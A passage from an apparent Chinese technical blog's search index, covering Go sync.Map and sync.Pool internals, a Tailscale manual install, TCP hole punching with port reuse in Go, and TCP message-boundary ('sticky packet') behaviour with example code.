dirty字段的长度后，需要对 read字段进行替换。 readOnly 结构：readOnly 结构是 Map 中的 read 字段，主要用来并发读。在 readOnly中包含以下字段：\nm 字段：m是一个原始的 map结构，用来并发读； amended字段：判断 read和 dirty是否存在差别； entry字段用来存储值，entry的p存在着三种状态：\nnil：说明这个键值对已被删除，并且 m.dirty == nil，或 m.dirty[k]指向该 entry； expunged：说明这条键值对已被删除，并且 m.dirty != nil，且 m.dirty 中没有这个 key； 正常值：p 指向一个正常的值，表示实际 interface{} 的地址，并且被记录在 m.read.m[key] 中。如果这时 m.dirty 不为 nil，那么它也被记录在 m.dirty[key] 中。两者实际上指向的是同一个指针。 下面将对每个步骤进行详细的分析。\nStore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 func (m *Map) Store(key, value any) { _, _ = m.Swap(key, value) } func (m *Map) Swap(key, value any) (previous any, loaded bool) { // 加载 read 中的 map read := m.loadReadOnly() // 判断 key 是否在 map 中 if e, ok := read.m[key]; ok { // 如果存在 key，尝试更新值 if v, ok := e.trySwap(\u0026amp;value); ok { if v == nil { return nil, false } return *v, true } } // 需要写入 dirty，因此需要进行加锁 m.mu.Lock() // 再次对 read 进行判断，防止在加锁之前已经被其他 goroutine 更新 read = m.loadReadOnly() if e, ok := read.m[key]; ok { // 如果 e 的值为expunged，则将 e 的值重置为 nil，并直接写入 dirty（因为如果为 expunged 则代表 dirty != nil）。 // 如果已经重置过了，则不需要进行重置和写入 dirty if e.unexpungeLocked() { m.dirty[key] = e } // 存储值 if v := e.swapLocked(\u0026amp;value); v != nil { loaded = true previous = *v } } else if e, ok := m.dirty[key]; ok { // 如果 dirty 中已经有值了，则直接存储值 if v := e.swapLocked(\u0026amp;value); v != nil { loaded = true previous = *v } } else { // 更新 read 的 amended 字段\tif !read.amended { m.dirtyLocked() m.read.Store(\u0026amp;readOnly{m: read.m, amended: true}) } // 存储值 m.dirty[key] = newEntry(value) } m.mu.Unlock() return previous, loaded } func (m *Map) loadReadOnly() readOnly { if p := m.read.Load(); p != nil { return *p } return readOnly{} } func (m *Map) dirtyLocked() { if m.dirty != nil { return } read := m.loadReadOnly() // 将 read 的中的有效值复制到 dirty 中 m.dirty = make(map[any]*entry, len(read.m)) for k, e := range read.m { if !e.tryExpungeLocked() { m.dirty[k] = e } } } func (e *entry) trySwap(i *any) (*any, bool) { for { p := e.p.Load() // 如果 p 为 expunged,那么说明这个 key 已经被删除，并且不在 dirty，不能直接更新 if p == expunged { return nil, false } if e.p.CompareAndSwap(p, i) { return p, true } } } func (e *entry) unexpungeLocked() (wasExpunged bool) { return e.p.CompareAndSwap(expunged, nil) } func (e *entry) swapLocked(i *any) *any { return e.p.Swap(i) } func (e *entry) tryExpungeLocked() (isExpunged bool) { p := e.p.Load() for p == nil { if e.p.CompareAndSwap(nil, expunged) { return true } p = e.p.Load() } return p == expunged } 通过代码分析可以发现，在存储值时首先会去 read查找 key 是否存在，如果能找到，那么通过改变 entry的指针来改变值，这个过程是 lock-free 的。\n如果在 read 中查找不到或存在过但是未及时清理的，那么会去更新 dirty ，这个过程是需要加锁的。\nLoad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 func (m *Map) Load(key any) (value any, ok bool) { // 读取 read 字段中的值 read := m.loadReadOnly() e, ok := read.m[key] // 如果read中不存在，并且dirty和read没有保持一致，则尝试去 dirty 取值 if !ok \u0026amp;\u0026amp; read.amended { m.mu.Lock() // 重复尝试，防止数据read被更改 read = m.loadReadOnly() e, ok = read.m[key] if !ok \u0026amp;\u0026amp; read.amended { // 从 dirty 查值 e, ok = m.dirty[key] // 判断是否需要更新 read 和 dirty m.missLocked() } m.mu.Unlock() } // 判断是否取到了值 if !ok { return nil, false } return e.load() } func (m *Map) missLocked() { // 增加 misses 次数 m.misses++ // 如果 miss 次数大于了 dirty 的长度，就把 dirty的值赋值给 read，并把 dirty 清空 if m.misses \u0026lt; len(m.dirty) { return } m.read.Store(\u0026amp;readOnly{m: m.dirty}) m.dirty = nil m.misses = 0 } func (e *entry) load() (value any, ok bool) { p := e.p.Load() // 判断值是否有效 if p == nil || p == expunged { return nil, false } return *p, true } 通过代码分析可以发现，sync.Map 在 Load 值的过程依然是先从 read中取值（lock-free的）；read中取不到值再尝试从dirty中取值（需要加锁）。\n并且在取值的过程中，如果多次未击中read，那么则会将 dirty中的值拷贝到read中，这样能够保证及时将最新的值写入到read中。\nDelete 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 func (m *Map) Delete(key any) { m.LoadAndDelete(key) } func (m *Map) LoadAndDelete(key any) (value any, loaded bool) { read := m.loadReadOnly() e, ok := read.m[key] // 如果 read 中没有 key，且read和dirty有差别，则尝试从dirty取值 if !ok \u0026amp;\u0026amp; read.amended { m.mu.Lock() read = m.loadReadOnly() e, ok = read.m[key] if !ok \u0026amp;\u0026amp; read.amended { e, ok = m.dirty[key] // 从 dirty 中实际删除值 delete(m.dirty, key) // 判断是否需要更新 read m.missLocked() } m.mu.Unlock() } if ok { return e.delete() } return nil, false } func (e *entry) delete() (value any, ok bool) { for { p := e.p.Load() if p == nil || p == expunged { return nil, false } if e.p.CompareAndSwap(p, nil) { return *p, true } } } 通过代码分析可以发现，sync.Map 在 Delete 值的过程依然是先从 read中取值（lock-free的）；read中取不到值再尝试从dirty中取值（需要加锁），如果在dirty中取到了值，那么会直接从dirty中删除这个值。\n在取到值后，会将这个值置为 nil。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sync.map-%E8%AF%A6%E8%A7%A3/","title":"sync.Map 详解"},{"content":"sync.Pool 详解 sync.Pool是 Go 官方提供的对象缓存池，能够帮助我们缓存暂时不用的对象，直到下次取出，避免重复创建对象。\n结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 type Pool struct { noCopy noCopy local unsafe.Pointer // local fixed-size per-P pool, actual type is [P]poolLocal localSize uintptr // size of the local array victim unsafe.Pointer // local from previous cycle victimSize uintptr // size of victims array // New optionally specifies a function to generate // a value when Get would otherwise return nil. // It may not be changed concurrently with calls to Get. New func() any } type poolLocal struct { poolLocalInternal // Prevents false sharing on widespread platforms with // 128 mod (cache line size) = 0 . pad [128 - unsafe.Sizeof(poolLocalInternal{})%128]byte } // Local per-P Pool appendix. type poolLocalInternal struct { private any // Can be used only by the respective P. shared poolChain // Local P can pushHead/popHead; any P can popTail. } Pool 结构是主要结构体:\nnoCopy：防止 Pool 被拷贝； local：poolLocal 数组指针，数组长度和 P 相关（即 GMP 模型中的 P）； localSize：local 数组的长度； victim：上一轮 GC 时 local 的值； victimSize：victim 数组的长度； New：当对象池种没有对象时，创建新对象的回调函数。 poolLocal结构主要用于对象缓存，是对 poolLocalInternal结构的封装：\npad：填充数组，用于防止 false sharing，详情可见此文章：What’s false sharing and how to solve it (using Golang as example)； poolLocalInternal对象存储主要实现：\nprivate：缓存对象，同时只能被一个 P 访问； shared：共享缓存对象，同时可以被多个 P 访问。 Put方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 func (p *Pool) Put(x any) { // 当放入的对象为 nil 时，函数直接返回，不执行放入对象池操作 if x == nil { return } // race 相关代码是为了通过竞态检测，这里不用分析 if race.Enabled { if fastrandn(4) == 0 { // Randomly drop x on floor. return } race.ReleaseMerge(poolRaceAddr(x)) race.Disable() } // 返回一个 poolLocal 对象 l, _ := p.pin() // 如果 poolLocal 的 private 为空，则直接将对象赋值给 private if l.private == nil { l.private = x } else { // 如果 poolLoca 的 private 不为空，则将对象放入共享队列 l.shared.pushHead(x) } // 将当前 G 与 M 解锁 runtime_procUnpin() if race.Enabled { race.Enable() } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func (p *Pool) pin() (*poolLocal, int) { // 将当前 G 和 M 绑定，并获取目前 M 绑定的 P 的 ID pid := runtime_procPin() // In pinSlow we store to local and then to localSize, here we load in opposite order. // Since we\u0026#39;ve disabled preemption, GC cannot happen in between. // Thus here we must observe local at least as large localSize. // We can observe a newer/larger local, it is fine (we must observe its zero-initialized-ness). // 原子操作取出 localSize s := runtime_LoadAcquintptr(\u0026amp;p.localSize) // load-acquire // 取出 local l := p.local // load-consume // 如果 pid 小于 s，则直接将 l 转换为 poolLocal if uintptr(pid) \u0026lt; s { return indexLocal(l, pid), pid } // 如果 pid 大于 s，则代表要么是还未进行初始化，要么是 runtime.GOMAXPROCS() 发生了变化，需要重新进行赋值 return p.pinSlow() } // 类型转换 func indexLocal(l unsafe.Pointer, i int) *poolLocal { lp := unsafe.Pointer(uintptr(l) + uintptr(i)*unsafe.Sizeof(poolLocal{})) return (*poolLocal)(lp) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func (p *Pool) pinSlow() (*poolLocal, int) { // Retry under the mutex. // Can not lock the mutex while pinned. // 解除绑定 // 先解锁再加锁，避免出现死锁 runtime_procUnpin() // 加上全局锁 allPoolsMu.Lock() defer allPoolsMu.Unlock() // 重新绑定 pid := runtime_procPin() // poolCleanup won\u0026#39;t be called while we are pinned. // 重新进行判断 s := p.localSize l := p.local if uintptr(pid) \u0026lt; s { return indexLocal(l, pid), pid } if p.local == nil { allPools = append(allPools, p) } // If GOMAXPROCS changes between GCs, we re-allocate the array and lose the old one. size := runtime.GOMAXPROCS(0) local := make([]poolLocal, size) // 原子操作更换 p.local 的值 atomic.StorePointer(\u0026amp;p.local, unsafe.Pointer(\u0026amp;local[0])) // store-release // 原子操作存储 p.localSize 值 runtime_StoreReluintptr(\u0026amp;p.localSize, uintptr(size)) // store-release return \u0026amp;local[pid], pid } Get方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 func (p *Pool) Get() any { if race.Enabled { race.Disable() } // 返回当前 M 绑定的 P 的ID号以及所对应的 poolLocal l, pid := p.pin() // 获取 poolLocal 上的 private，然后将其置空 x := l.private l.private = nil if x == nil { // Try to pop the head of the local shard. We prefer // the head over the tail for temporal locality of // reuse. // 如果变量为空，则尝试从自身共享 shared 上拿去一个 x, _ = l.shared.popHead() // 如果依然为空，则尝试从其他 P 的 poolLocal 中拿取一个 if x == nil { x = p.getSlow(pid) } } // 解绑 P runtime_procUnpin() if race.Enabled { race.Enable() if x != nil { race.Acquire(poolRaceAddr(x)) } } // 如果整个对象池中都不存在数据，则尝试调用 New 方法创建一个 if x == nil \u0026amp;\u0026amp; p.New != nil { x = p.New() } return x } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 func (p *Pool) getSlow(pid int) any { // See the comment in pin regarding ordering of the loads. // 加载 local 和 size size := runtime_LoadAcquintptr(\u0026amp;p.localSize) // load-acquire locals := p.local // load-consume // Try to steal one element from other procs. // 从其他 P 对应的 poolLocal 的共享对象中尝试拿去一个 for i := 0; i \u0026lt; int(size); i++ { l := indexLocal(locals, (pid+i+1)%int(size)) if x, _ := l.shared.popTail(); x != nil { return x } } // Try the victim cache. We do this after attempting to steal // from all primary caches because we want objects in the // victim cache to age out if at all possible. // 如果从当前 local 拿不到数据，则从老的 victim 中尝试拿数据 size = atomic.LoadUintptr(\u0026amp;p.victimSize) if uintptr(pid) \u0026gt;= size { return nil } locals = p.victim l := indexLocal(locals, pid) if x := l.private; x != nil { l.private = nil return x } for i := 0; i \u0026lt; int(size); i++ { l := indexLocal(locals, (pid+i)%int(size)) if x, _ := l.shared.popTail(); x != nil { return x } } // Mark the victim cache as empty for future gets don\u0026#39;t bother // with it. // 如果从老的数据中依然取不到数据，则下次将 victimSize 置空，避免下次再尝试从 victim 中取数据 atomic.StoreUintptr(\u0026amp;p.victimSize, 0) return nil } poolChain poolChain是一个链头非并发安全，链尾并发安全的链表。\n结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 双向链表 type poolChain struct { head *poolChainElt tail *poolChainElt } // 环形队列 type poolChainElt struct { poolDequeue next, prev *poolChainElt } type poolDequeue struct { headTail uint64 vals []eface } type eface struct { typ, val unsafe.Pointer } 方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 func (c *poolChain) pushHead(val any) { d := c.head // 初始化链表 if d == nil { // Initialize the chain. const initSize = 8 // Must be a power of 2 d = new(poolChainElt) d.vals = make([]eface, initSize) // 头节点非互斥赋值 // 在 sync.Pool 中，头节点是被单 goroutine 用于数据访问的，因此不用做互斥 c.head = d // 尾节点互斥赋值 // 在 sync.Pool 中，尾节点可能会被多个 goroutine 用于数据访问，因此需要做互斥 storePoolChainElt(\u0026amp;c.tail, d) } // 将数据放入环形队列头部 // 当环形队列满时会返回 False if d.pushHead(val) { return } // The current dequeue is full. Allocate a new one of twice // the size. // 创建一个新环形队列，新的环形队列的容量是上一个的两倍，但是不能超过dequeueLimit newSize := len(d.vals) * 2 if newSize \u0026gt;= dequeueLimit { // Can\u0026#39;t make it any bigger. newSize = dequeueLimit } // 添加新节点 d2 := \u0026amp;poolChainElt{prev: d} d2.vals = make([]eface, newSize) c.head = d2 storePoolChainElt(\u0026amp;d.next, d2) d2.pushHead(val) } func (c *poolChain) popHead() (any, bool) { d := c.head // 遍历链表取值 for d != nil { if val, ok := d.popHead(); ok { return val, ok } d = loadPoolChainElt(\u0026amp;d.prev) } return nil, false } func (c *poolChain) popTail() (any, bool) { // 互斥取出尾节点地址 d := loadPoolChainElt(\u0026amp;c.tail) if d == nil { return nil, false } // 循环遍历节点，弹出数据，直到找到尾节点 for { d2 := loadPoolChainElt(\u0026amp;d.next) if val, ok := d.popTail(); ok { return val, ok } if d2 == nil { return nil, false } // 删除空节点 if atomic.CompareAndSwapPointer((*unsafe.Pointer)(unsafe.Pointer(\u0026amp;c.tail)), unsafe.Pointer(d), unsafe.Pointer(d2)) { storePoolChainElt(\u0026amp;d2.prev, nil) } d = d2 } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 // 解析头尾节点索引 func (d *poolDequeue) unpack(ptrs uint64) (head, tail uint32) { const mask = 1\u0026lt;\u0026lt;dequeueBits - 1 head = uint32((ptrs \u0026gt;\u0026gt; dequeueBits) \u0026amp; mask) tail = uint32(ptrs \u0026amp; mask) return } // 封装头尾节点索引 func (d *poolDequeue) pack(head, tail uint32) uint64 { const mask = 1\u0026lt;\u0026lt;dequeueBits - 1 return (uint64(head) \u0026lt;\u0026lt; dequeueBits) | uint64(tail\u0026amp;mask) } func (d *poolDequeue) pushHead(val any) bool { ptrs := atomic.LoadUint64(\u0026amp;d.headTail) head, tail := d.unpack(ptrs) // 如果首尾地址相同代表循环队列已经满了 if (tail+uint32(len(d.vals)))\u0026amp;(1\u0026lt;\u0026lt;dequeueBits-1) == head { // Queue is full. return false } slot := \u0026amp;d.vals[head\u0026amp;uint32(len(d.vals)-1)] typ := atomic.LoadPointer(\u0026amp;slot.typ) if typ != nil { return false } if val == nil { val = dequeueNil(nil) } *(*any)(unsafe.Pointer(slot)) = val // 索引位置增加一位 atomic.AddUint64(\u0026amp;d.headTail, 1\u0026lt;\u0026lt;dequeueBits) return true } func (d *poolDequeue) popHead() (any, bool) { var slot *eface for { ptrs := atomic.LoadUint64(\u0026amp;d.headTail) head, tail := d.unpack(ptrs) if tail == head { return nil, false } head-- ptrs2 := d.pack(head, tail) if atomic.CompareAndSwapUint64(\u0026amp;d.headTail, ptrs, ptrs2) { slot = \u0026amp;d.vals[head\u0026amp;uint32(len(d.vals)-1)] break } } val := *(*any)(unsafe.Pointer(slot)) if val == dequeueNil(nil) { val = nil } *slot = eface{} return val, true } func (d *poolDequeue) popTail() (any, bool) { var slot *eface for { ptrs := atomic.LoadUint64(\u0026amp;d.headTail) head, tail := d.unpack(ptrs) if tail == head { return nil, false } ptrs2 := d.pack(head, tail+1) if atomic.CompareAndSwapUint64(\u0026amp;d.headTail, ptrs, ptrs2) { slot = \u0026amp;d.vals[tail\u0026amp;uint32(len(d.vals)-1)] break } } val := *(*any)(unsafe.Pointer(slot)) if val == dequeueNil(nil) { val = nil } // 注意：此处可能与 pushHead 发生竞争，解决方案是： // 1. 让 pushHead 先读取 typ 的值，如果 typ 值不为 nil，则说明 popTail 尚未清理完 slot // 2. 让 popTail 先清理掉 val 中的内容，在清理掉 typ，从而确保不会与 pushHead 对 slot 的写行为发生竞争 slot.val = nil atomic.StorePointer(\u0026amp;slot.typ, nil) return val, true } Other Method 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 func init() { // 将 poolCleanup 注册到 runtime, 该函数会在 GC 执行前执行 runtime_registerPoolCleanup(poolCleanup) } // poolCleanup 用于清理缓存对象，避免缓存对象一直不过期 // 缓存对象会在第二个 GC 到来前被清理 func poolCleanup() { // 由于在执行 poolCleanup 时，已经进入了 STW 状态，因此不能执行 runtime 相关函数以及新对象的创建 // This function is called with the world stopped, at the beginning of a garbage collection. // It must not allocate and probably should not call any runtime functions. // Because the world is stopped, no pool user can be in a // pinned section (in effect, this has all Ps pinned). // Drop victim caches from all pools. // 将老的 pool 的 victim 全部清空 for _, p := range oldPools { p.victim = nil p.victimSize = 0 } // Move primary cache to victim cache. // 将 poolLocal 的当前 local 移动到 victim for _, p := range allPools { p.victim = p.local p.victimSize = p.localSize p.local = nil p.localSize = 0 } // The pools with non-empty primary caches now have non-empty // victim caches and no pools have primary caches. // 将现在的 pools 标记为老的 oldPools, allPools = allPools, nil } var ( allPoolsMu Mutex allPools []*Pool oldPools []*Pool ) // Implemented in runtime. func runtime_registerPoolCleanup(cleanup func()) func runtime_procPin() int func runtime_procUnpin() // The below are implemented in runtime/internal/atomic and the // compiler also knows to intrinsify the symbol we linkname into this // package. //go:linkname runtime_LoadAcquintptr runtime/internal/atomic.LoadAcquintptr func runtime_LoadAcquintptr(ptr *uintptr) uintptr //go:linkname runtime_StoreReluintptr runtime/internal/atomic.StoreReluintptr func runtime_StoreReluintptr(ptr *uintptr, val uintptr) uintptr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // src/runtime/mgc.go //go:linkname sync_runtime_registerPoolCleanup sync.runtime_registerPoolCleanup func sync_runtime_registerPoolCleanup(f func()) { poolcleanup = f } func clearpools() { // clear sync.Pools if poolcleanup != nil { poolcleanup() } ...... } func gcStart(trigger gcTrigger) { ...... // clearpools before we start the GC. If we wait they memory will not be // reclaimed until the next GC cycle. clearpools() ...... } 总结 通过代码分析发现 sync.Pool有以下特性：\n为每个 P 绑定一个 poolLocal 对象，每个 poolLocal 中有一个 private对象。private对象只能被对应的 P 访问，因此访问 private时不需要进行加锁； poolLocal中的shared是一个无锁、并发安全的环形链表。能够同时被不同的 P 访问； 对象池中的对象在遇到的第二个 GC 时会被删除。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sync.pool-%E8%AF%A6%E8%A7%A3/","title":"sync.Pool 详解"},{"content":"Tailscale 安装 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 1. 下载安装包 wget https://pkgs.tailscale.com/stable/tailscale_1.34.2_amd64.tgz # 2. 解压 tar zxvf tailscale_1.34.2_amd64.tgz output: tailscale_1.34.2_amd64/ tailscale_1.34.2_amd64/tailscale tailscale_1.34.2_amd64/tailscaled tailscale_1.34.2_amd64/systemd/ tailscale_1.34.2_amd64/systemd/tailscaled.defaults tailscale_1.34.2_amd64/systemd/tailscaled.service # 3. 拷贝程序 cp tailscale_1.34.2_amd64/tailscale /usr/bin/tailscale cp tailscale_1.34.2_amd64/tailscaled /usr/sbin/tailscaled # 4. 拷贝 service 程序 cp tailscale_1.34.2_amd64/systemd/tailscaled.service /lib/systemd/system/tailscaled.service # 5. 将环境变量配置文件复制到系统路径下 cp tailscale_1.34.2_amd64/systemd/tailscaled.defaults /etc/default/tailscaled # 5. 启动 tailscaled.service 并设置开机自启 systemctl enable --now tailscaled # 6. 查看服务状态 systemctl status tailscaled.service ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tailscale-%E5%AE%89%E8%A3%85/","title":"Tailscale 安装"},{"content":"TCP socket option SO_LINGER SO_LINGER 参数用于设置 TCP 延迟关闭的时间。\n默认情况下，TCP socket 在调用 close 后，会发送 FIN 并立即进行清理工作。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tcp-socket-option/","title":"TCP socket option"},{"content":"TCP 实现 P2P 简介 市面上实现 P2P 的产品主要都是以 UDP 协议为主。因为 UDP 是无连接的，能够往任意地址发包，便于实现 P2P 的能力。\n但是 UDP 同时也是不可靠的，如果想要实现可靠传输得自己基于 UDP 去实现可靠传输协议，例如 QUIC、KCP、SCTP 等基于 UDP 实现的可靠连接。\n但是基于 UDP 实现的可靠传输是位于应用层，运行在用户态的。\n而 TCP 协议是操作系统网络栈原生支持的，而且经过这么多年在操作系统内核层面的优化，TCP 性能是十分能打的，如果我们能够基于 TCP 建立 P2P 连接，对于我们应用层来说就会省事很多了。\n实现 要想实现基于 TCP 的 P2P，那么 TCP 也必须像 UDP 那样向不同地址建立连接时使用同一个 Src IP + Src Port。\n要实现这个效果就需要使用 Linux 中的端口重用技术。端口重用技术运行我们使用同一个 Src IP + Src Port 向不同的目的地址发起 TCP 连接。\n下面是用 Go 实现的 Demo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;time\u0026#34; ) func main() { addr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, \u0026#34;:34567\u0026#34;) if err != nil { panic(err) } dialer := net.Dialer{ LocalAddr: addr, Control: func(network, address string, c syscall.RawConn) error { return c.Control(func(fd uintptr) { syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xf, 1) }) }, } go func() { listen := net.ListenConfig{ Control: func(network, address string, c syscall.RawConn) error { return c.Control(func(fd uintptr) { syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xf, 1) }) }, } tcp, err := listen.Listen(context.Background(), \u0026#34;tcp\u0026#34;, \u0026#34;:34567\u0026#34;) if err != nil { panic(err) } log.Printf(\u0026#34;start listen at %s ...\u0026#34;, tcp.Addr()) for { conn, err := tcp.Accept() if err != nil { panic(err) } log.Printf(\u0026#34;accept new conn: %s -\u0026gt; %s\u0026#34;, conn.RemoteAddr(), conn.LocalAddr()) } }() conn1, err := dialer.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;stun server\u0026#34;) if err != nil { panic(err) } log.Printf(\u0026#34;%s -\u0026gt; %s\u0026#34;, conn1.LocalAddr(), conn1.RemoteAddr()) log.Println(\u0026#34;输入对端地址: \u0026#34;) var peer string fmt.Scanln(\u0026amp;peer) log.Printf(\u0026#34;对端地址: %s\u0026#34;, peer) for i := 0; i \u0026lt; 10; i++ { ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) conn, err := dialer.DialContext(ctx, \u0026#34;tcp\u0026#34;, peer) cancel() if err != nil { log.Printf(\u0026#34;第 %d 次连接 %s 失败: %s\u0026#34;, i, peer, err) time.Sleep(5 * time.Second) continue } log.Printf(\u0026#34;%s -\u0026gt; %s\u0026#34;, conn.LocalAddr(), conn.RemoteAddr()) break } } 上面的 Demo 中，TCP dial 和 listen 在同一个 Src IP + Src Port 上，进行多次尝试之后就能达到与 UDP 一样的 P2P 打洞效果。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tcp-%E5%AE%9E%E7%8E%B0-p2p/","title":"TCP 实现 P2P"},{"content":"TCP 粘包问题 问题复现 先来看一个简单的 tcp cs的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // server.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { listen, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:8080\u0026#34;) if err != nil { return } defer listen.Close() for { conn, err := listen.Accept() if err != nil { return } fmt.Printf(\u0026#34;local: %s -\u0026gt; remote: %s \\n\u0026#34;, conn.LocalAddr(), conn.RemoteAddr()) for i := 0; i \u0026lt; 100; i++ { _, err := conn.Write([]byte(fmt.Sprintf(\u0026#34;hello %d\u0026#34;, i))) if err != nil { return } } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // client.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { dial, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:8080\u0026#34;) if err != nil { return } defer dial.Close() for i := 0; i \u0026lt; 100; i++ { buff := make([]byte, 1024) read, err := dial.Read(buff) if err != nil { return } fmt.Println(fmt.Sprintf(\u0026#34;length: %d packet: [%s]\u0026#34;, read, string(buff[:read]))) } } 运行两个程序，会发现客户端得到了类似输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 length: 7 packet: [hello 0] length: 71 packet: [hello 1hello 2hello 3hello 4hello 5hello 6hello 7hello 8hello 9hello 10] length: 32 packet: [hello 11hello 12hello 13hello 14] length: 16 packet: [hello 15hello 16] length: 40 packet: [hello 17hello 18hello 19hello 20hello 21] length: 32 packet: [hello 22hello 23hello 24hello 25] length: 16 packet: [hello 26hello 27] length: 24 packet: [hello 28hello 29hello 30] length: 8 packet: [hello 41] length: 16 packet: [hello 42hello 43] length: 16 packet: [hello 44hello 45] length: 16 packet: [hello 46hello 47] length: 16 packet: [hello 48hello 49] length: 16 packet: [hello 50hello 51] length: 24 packet: [hello 52hello 53hello 54] length: 24 packet: [hello 55hello 56hello 57] length: 16 packet: [hello 58hello 59] length: 16 packet: [hello 60hello 61] length: 24 packet: [hello 62hello 63hello 64] length: 120 packet: [hello 65hello 66hello 67hello 68hello 69hello 70hello 71hello 72hello 73hello 74hello 75hello 76hello 77hello 78hello 79] length: 56 packet: [hello 80hello 81hello 82hello 83hello 84hello 85hello 86] length: 32 packet: [hello 87hello 88hello 89hello 90] length: 24 packet: [hello 91hello 92hello 93] length: 24 packet: [hello 94hello 95hello 96] length: 24 packet: [hello 97hello 98hello 99] 我们发现，客户端出现得到的包顺序是正确的，但是存在多个包重叠在一起被读出来的情况。\n我们接收的时候部分 tcp 数据粘合在一起被我们读出来，这种情况就是 TCP 粘包问题。\n问题解读 “TCP 粘包问题” 准确来说不是一个问题，这本身就是 TCP 的特性：\n传输控制协议（英语：Transmission Control Protocol，缩写：TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。在简化的计算机网络OSI模型中，它完成第四层传输层所指定的功能。用户数据报协议（UDP）是同一层内另一个重要的传输协议。\nTCP 是一种流式传输的协议，数据包在发送和接收的时候都会先存储在缓冲区。TCP 每一次读取数据时会从缓冲区拿到所有数据，如果接收端未及时从缓冲区取出数据，就容易出现粘包现象。\n与粘包问题相似的是 TCP 的半包问题：半包问题指 tcp 发送包时数据包只发送了一部分，没有完整发送。\n出现半包问题的原因主要在于 TCP 的 Nagle算法，Nagle 算法会让 TCP 在发送缓冲区存放多个小包，然后在发送时一次性将缓冲区内容全部读取出来发送出去。如果数据包在未完全写入缓冲区时，缓冲区已经满了，就会导致 TCP 出现半包现象。\n因此粘包和半包实际上都不是 TCP 的问题，是应用层协议没有做好边界解析造成的问题。\n解决方案 